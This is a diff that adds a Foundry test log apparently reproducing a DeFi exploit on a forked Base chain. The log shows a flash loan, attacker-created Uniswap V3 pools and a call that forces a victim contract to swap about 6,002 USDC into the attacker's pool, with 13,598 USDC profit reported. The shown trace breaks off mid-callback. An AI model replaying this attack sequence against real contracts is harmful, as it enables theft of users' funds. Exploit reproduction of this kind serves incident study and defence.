@@ -1,0 +1,561 @@
+Warning: Found unknown `eth_rpc_retries` config for profile `default` defined in foundry.toml.
+No files changed, compilation skipped
+
+Ran 1 test for test/AIXBTForcedSwap_exp.sol:ContractTest
+[PASS] testExploit() (gas: 12355684)
+Logs:
+  Attacker Before exploit USDC Balance: 0.000000
+  Attacker USDC profit: 13598.795675
+  Attacker After exploit USDC Balance: 13598.795675
+
+Traces:
+  [14394] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("base", 25559856 [2.555e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647], "Attacker EOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], "Victim contract")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], "AIXBT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], "USDC")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0x4200000000000000000000000000000000000006], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], "Uniswap V3 position manager")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], "Uniswap V3 swap router")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4], "AIXBT/USDC flash pool")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [13013284] ContractTest::testExploit()
+    ├─ [10281] USDC::symbol() [staticcall]
+    │   ├─ [3081] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [3250] USDC::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [staticcall]
+    │   ├─ [2553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [3043] USDC::decimals() [staticcall]
+    │   ├─ [2381] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit USDC Balance", val: 0, decimals: 6)
+    ├─ [1638527] → new AIXBTForcedSwapExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 8182 bytes of code
+    ├─ [1250] USDC::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [staticcall]
+    │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647])
+    │   └─ ← [Return]
+    ├─ [11286495] AIXBTForcedSwapExploit::attack()
+    │   ├─ [11282410] AIXBT/USDC flash pool::flash(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19], 0, 0x0000000000000000000000000000000000000000000000008ac7230489e80000)
+    │   │   ├─ [5349] AIXBT::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [staticcall]
+    │   │   │   ├─ [2677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 16976254835688503845896483 [1.697e25]
+    │   │   │   └─ ← [Return] 16976254835688503845896483 [1.697e25]
+    │   │   ├─ [3250] USDC::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [staticcall]
+    │   │   │   ├─ [2553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 707957366111 [7.079e11]
+    │   │   │   └─ ← [Return] 707957366111 [7.079e11]
+    │   │   ├─ [42538] AIXBT::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19])
+    │   │   │   ├─ [42360] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4], to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10000000000000000000 [1e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x87140ad5d6c04fa51ab2efc22332abe29a9931c2869c76aff0299bccafeb6adb: 0x0000000000000000000000000000000000000000000e0adc9e618dbf25d4c123 → 0x0000000000000000000000000000000000000000000e0adc139a6aba9becc123
+    │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [11204482] AIXBTForcedSwapExploit::uniswapV3FlashCallback(30000000000000000 [3e16], 0, 0x0000000000000000000000000000000000000000000000008ac7230489e80000)
+    │   │   │   ├─ [24870] AIXBT::approve(Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ [24692] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::approve(Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x41c5594f6c4d9ce902f20d3bc59402c331026116d7cf82d3e9b1c17491af980e: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [27341] USDC::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ [26673] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   │   │   │   ├─ emit Approval(owner: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x67c2cc3f4367e07c4f8617fe0afa81708f63cbdc77d16f5d25dc0b1d3437fcef: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [24399] WETH::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xa7e972984f6ee642d68296e627cc424b6d3009bd63ca93fdab58909f040d1348: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [4651073] Uniswap V3 position manager::createAndInitializePoolIfNecessary(AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], 100, 79228162514264337593543950336 [7.922e28])
+    │   │   │   │   ├─ [2666] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::getPool(AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], 100) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ [4594718] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::createPool(AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], 100)
+    │   │   │   │   │   ├─ [4435593] → new <unknown>@0xD89D10DA694187284CCc6B560Af3aAd52ff66598
+    │   │   │   │   │   │   ├─ [734] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::parameters() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000033128a8fc17869897dce68ed026d694621f6fdfd0000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda0291300000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   └─ ← [Return] 22142 bytes of code
+    │   │   │   │   │   ├─ emit PoolCreated(token0: AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], token1: USDC: [0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913], fee: 100, tickSpacing: 1, pool: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xa040531f1834bd8d9e669a956d23559f053d290f6971036e9e5766bf39174473: 0 → 0x000000000000000000000000d89d10da694187284ccc6b560af3aad52ff66598
+    │   │   │   │   │   │   @ 0x6e81bc1c8794cf3397805b2fb23a8d3854b58b405cc2eaffe0d3c06867a94110: 0 → 0x000000000000000000000000d89d10da694187284ccc6b560af3aad52ff66598
+    │   │   │   │   │   └─ ← [Return] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598
+    │   │   │   │   ├─ [48952] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::initialize(79228162514264337593543950336 [7.922e28])
+    │   │   │   │   │   ├─ emit Initialize(sqrtP: 79228162514264337593543950336 [7.922e28], tick: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0 → 0x0100000000000000000000000000000000000000000000000000000067966343
+    │   │   │   │   │   │   @ 0: 0 → 0x0001000001000100000000000000000000000001000000000000000000000000
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598
+    │   │   │   ├─ [4640573] Uniswap V3 position manager::createAndInitializePoolIfNecessary(WETH: [0x4200000000000000000000000000000000000006], AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], 100, 79228162514264337593543950336 [7.922e28])
+    │   │   │   │   ├─ [2666] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::getPool(WETH: [0x4200000000000000000000000000000000000006], AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], 100) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   │   │   ├─ [4586718] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::createPool(WETH: [0x4200000000000000000000000000000000000006], AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], 100)
+    │   │   │   │   │   ├─ [4435593] → new <unknown>@0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45
+    │   │   │   │   │   │   ├─ [734] 0x33128a8fC17869897dcE68Ed026d694621f6FDfD::parameters() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000033128a8fc17869897dce68ed026d694621f6fdfd00000000000000000000000042000000000000000000000000000000000000060000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a82500000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   │   │   │   └─ ← [Return] 22142 bytes of code
+    │   │   │   │   │   ├─ emit PoolCreated(token0: WETH: [0x4200000000000000000000000000000000000006], token1: AIXBT: [0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825], fee: 100, tickSpacing: 1, pool: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x747d994f99a61db2719144bdaf1bfb6b13b2f07b40156771a709a1a5795cff4b: 0 → 0x000000000000000000000000151d156df6edcdb6e63f83ebe4a13f8079c1eb45
+    │   │   │   │   │   │   @ 0x0ecb3e4d9e44d4490d4c8152d91ae943c638350adbfe3557811cd7f38af3dd47: 0 → 0x000000000000000000000000151d156df6edcdb6e63f83ebe4a13f8079c1eb45
+    │   │   │   │   │   └─ ← [Return] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45
+    │   │   │   │   ├─ [48952] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::initialize(79228162514264337593543950336 [7.922e28])
+    │   │   │   │   │   ├─ emit Initialize(sqrtP: 79228162514264337593543950336 [7.922e28], tick: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0 → 0x0100000000000000000000000000000000000000000000000000000067966343
+    │   │   │   │   │   │   @ 0: 0 → 0x0001000001000100000000000000000000000001000000000000000000000000
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45
+    │   │   │   ├─ [849] AIXBT::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   │   │   ├─ [489650] Uniswap V3 position manager::mint(MintParams({ token0: 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825, token1: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, fee: 100, tickLower: 0, tickUpper: 100, amount0Desired: 10000000000000000000 [1e19], amount1Desired: 0, amount0Min: 0, amount1Min: 0, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, deadline: 1737909059 [1.737e9] }))
+    │   │   │   │   ├─ [696] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::slot0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 79228162514264337593543950336 [7.922e28], 0, 0, 1, 1, 0, true
+    │   │   │   │   ├─ [228886] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::mint(Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], 0, 100, 2005104164790028032878 [2.005e21], 0x0000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda0291300000000000000000000000000000000000000000000000000000000000000640000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   │   │   ├─ [2849] AIXBT::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [staticcall]
+    │   │   │   │   │   │   ├─ [2677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [31390] Uniswap V3 position manager::uniswapV3MintCallback(10000000000000000000 [1e19], 0, 0x0000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda0291300000000000000000000000000000000000000000000000000000000000000640000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   │   │   │   ├─ [28207] AIXBT::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, 10000000000000000000 [1e19])
+    │   │   │   │   │   │   │   ├─ [28023] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, 10000000000000000000 [1e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, value: 10000000000000000000 [1e19])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0x0000000000000000000000000000000000000000000000008ac7230489e80000 → 0
+    │   │   │   │   │   │   │   │   │   @ 0xb179bed1e4e93319112ce6ac26b0c7e20070d1b4977440a7d59ca95c1e16d5b2: 0 → 0x0000000000000000000000000000000000000000000000008ac7230489e80000
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [849] AIXBT::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [staticcall]
+    │   │   │   │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   │   │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
+    │   │   │   │   │   ├─ emit Mint(sender: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], tickLower: 0, tickUpper: 100, qty: 2005104164790028032878 [2.005e21], qty0: 10000000000000000000 [1e19], qty1: 0)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x54cdd369e4e8a8515e52ca72ec816c2101831ad1f18bf44102ed171459c9b4f8: 0 → 0x0000000000000000000000000000000000000010000000000000000000000001
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bc: 0 → 0x000000000000006cb268fe611ded5b6e000000000000006cb268fe611ded5b6e
+    │   │   │   │   │   │   @ 4: 0 → 0x00000000000000000000000000000000000000000000006cb268fe611ded5b6e
+    │   │   │   │   │   │   @ 0x8bb3b82bc56c3742e93c4dfa52614def9ee73bf9affdf902ecfd8b70520b12d8: 0 → 0x00000000000000000000000000000000000000000000006cb268fe611ded5b6e
+    │   │   │   │   │   │   @ 0x05b8ccbb9d4d8fb16ea74ce3c29a41f1b461fbdaff4714a0d9a8eb05499746bf: 0 → 0x0167966343000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   @ 0xad66b8e7ab72f450ddfdaf1c5bc10e3a3fabf9f63ad8aa07b8743b93722f0a45: 0 → 0xffffffffffffff934d97019ee212a492000000000000006cb268fe611ded5b6e
+    │   │   │   │   │   │   @ 0xad66b8e7ab72f450ddfdaf1c5bc10e3a3fabf9f63ad8aa07b8743b93722f0a48: 0 → 0x0100000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19], 0
+    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tokenId: 1944699 [1.944e6])
+    │   │   │   │   ├─ [1013] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::positions(0x7280365d5e2db2d8939f53fd23fa149d391091f6e23e1cedf7216b575322ecb6) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2005104164790028032878 [2.005e21], 0, 0, 0, 0
+    │   │   │   │   ├─ emit IncreaseLiquidity(tokenId: 1944699 [1.944e6], liquidity: 2005104164790028032878 [2.005e21], amount0: 10000000000000000000 [1e19], amount1: 0)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000000000000000001b8871 → 0x00000000000000000000000000000000000000000000000000000000001b8872
+    │   │   │   │   │   @ 0x7003493238fb86e7325d964754aa0f0ada25c891ac0890c3e4ed70bc4c65eb53: 0 → 0x00000000000000000000000000000000000000000000000000000000001b8872
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3f26bb0: 0 → 0x00000000000000000000000000000000000000000000000000000000001dac7b
+    │   │   │   │   │   @ 0x85c61306568a0e2c1f3e9bdf2b60af3b1d51cd63cc5cbc75b9b28bef7bb6864d: 0 → 1
+    │   │   │   │   │   @ 13: 0x00000000000000026584000000000000000000000000000000000000001dac7b → 0x00000000000000026585000000000000000000000000000000000000001dac7c
+    │   │   │   │   │   @ 0xb179bed1e4e93319112ce6ac26b0c7e20070d1b4977440a7d59ca95c1e16d5b2: 0 → 157060
+    │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 1
+    │   │   │   │   │   @ 0xdbfd8059561e5fb81077b1f480830e2958e36b3be2b3748b14a8b0940298d76b: 0 → 0x0000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825
+    │   │   │   │   │   @ 0xdbfd8059561e5fb81077b1f480830e2958e36b3be2b3748b14a8b0940298d76c: 0 → 0x000000000000000000000064833589fcd6edb6e08f4c7c32d4f71b54bda02913
+    │   │   │   │   │   @ 0x4e50448b3aa311118052b10f4ee67d43cad5b8d903fd9802242390017a7af17d: 0 → 0x00000000000000000000000000000000000000000000000000000000001dac7b
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3f26bb1: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │   @ 0x47887fe4b21ae31435861356eb29055568dc180fd13d9d6c18106c95072982d6: 0 → 0x000000000000006cb268fe611ded5b6e00006400000000000000000000026584
+    │   │   │   │   └─ ← [Return] 1944699 [1.944e6], 2005104164790028032878 [2.005e21], 10000000000000000000 [1e19], 0
+    │   │   │   ├─ [3250] USDC::balanceOf(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff]) [staticcall]
+    │   │   │   │   ├─ [2553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 6002760000 [6.002e9]
+    │   │   │   │   └─ ← [Return] 6002760000 [6.002e9]
+    │   │   │   ├─ [154604] Victim contract::229e9756(be152e386e99b9ecd50432823c89dc975e941f17cff5b2908f66a85b331a8434000000000000000000000000833589fcd6edb6e08f4c7c32d4f71b54bda029130000000000000000000000000000000000000000000000000000000165cad9400000000000000000000000004f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [25341] USDC::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 6002760000 [6.002e9])
+    │   │   │   │   │   ├─ [24673] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::approve(Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], 6002760000 [6.002e9]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Approval(owner: Victim contract: [0x32cD8541cCD275A70dDA33A9fD490D948A78E1ff], spender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], value: 6002760000 [6.002e9])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x6c4fed92ca9f0bd42c6ddae7595518c127cd4314b141d018ac5cbb51bca42903: 0 → 0x0000000000000000000000000000000000000000000000000000000165cad940
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [112553] Uniswap V3 swap router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, tokenOut: 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825, fee: 100, recipient: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, amountIn: 6002760000 [6.002e9], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   │   ├─ [107628] 0xD89D10DA694187284CCc6B560Af3aAd52ff66598::swap(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, false, 6002760000 [6.002e9], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000032cd8541ccd275a70dda33a9fd490d948a78e1ff000000000000000000000000000000000000000000000000000000000000002b833589fcd6edb6e08f4c7c32d4f71b54bda029130000644f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [29738] AIXBT::transfer(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, 6002159723 [6.002e9])
+    │   │   │   │   │   │   │   ├─ [29560] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, 6002159723 [6.002e9]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xD89D10DA694187284CCc6B560Af3aAd52ff66598, to: 0x9CFFd09a2c02f3E7b2a0EFEEe75628352F446117, value: 6002159723 [6.002e9])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0xe6532b96bd7bb64ea405995602530f9162ecea7b7abc4ce276ddfb5485ae3b9e: 0 → 0x0000000000000000000000000000000000000000000000000000000165c1b06b
+    │   │   │   │   │   │   │   │   │   @ 0xb179bed1e4e93319112ce6ac26b0c7e20070d1b4977440a7d59ca95c1e16d5b2: 0x0000000000000000000000000000000000000000000000008ac7230489e80000 → 0x0000000000000000000000000000000000000000000000008ac7230324264f95
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [3250] USDC::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(0xD89D10DA694187284CCc6B560Af3aAd52ff66598) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   ├─ [35235] Uniswap V3 swap router::uniswapV3SwapCallback(-6002159723 [-6.002e9], 6002760000 [6.002e9], 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000004000000000000000000000000032cd8541ccd275a70dda33a9fd490d948a78e1ff000000000000000000000000000000000000000000000000000000000000002b833589fcd6edb6e08f4c7c32d4f71b54bda029130000644f9fd6be4a90f2620860d680c0d4d5fb53d1a825000000000000000000000000000000000000000000)
